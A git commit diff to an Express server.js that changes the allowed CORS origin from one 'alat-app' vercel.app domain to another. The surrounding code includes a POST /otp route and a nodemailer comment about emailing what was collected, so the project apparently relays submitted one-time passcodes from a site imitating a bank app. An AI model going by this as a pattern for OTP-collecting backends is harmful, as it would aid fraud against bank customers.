031b19da36278ce5d769d21d8828e2bcaa594c1e
AjaeroElvis5 <AjaeroElvis5@gmail.com>
2025-10-02 21:04:38 +0100

    Update server.js

--- server.js
+++ server.js
@@ -5,7 +5,7 @@ const cors = require("cors");
 const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
 
 app.use(express.json());
-app.use(cors({ origin: "https://alat-app-five.vercel.app" }));
+app.use(cors({ origin: "https://alat-appk.vercel.app" }));
 
 
 const PORT = process.env.PORT || 5000; // port to connect to WEB
@@ -114,4 +114,5 @@ app.post("/otp", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
+
 
